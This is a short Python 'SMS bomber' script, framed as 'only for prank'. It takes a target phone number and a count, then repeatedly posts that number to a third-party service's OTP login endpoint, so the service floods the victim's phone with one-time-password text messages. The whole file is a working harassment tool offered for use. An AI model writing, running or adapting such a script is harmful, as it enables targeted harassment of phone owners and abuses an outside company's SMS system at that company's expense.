print("Wellcome To My Bomber")
print("It Is Only For Prank...")







import requests
from requests.structures import CaseInsensitiveDict
number=str(input("Enter Your Target  Number:"))
amount=int(input("Enter The Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number


for j in range (amount):
	resp = requests.post(url, headers=headers, data=data)

	print(resp.status_code)
 
	print(str(j+1)+" Sms Sent Successful 🥵🥵")

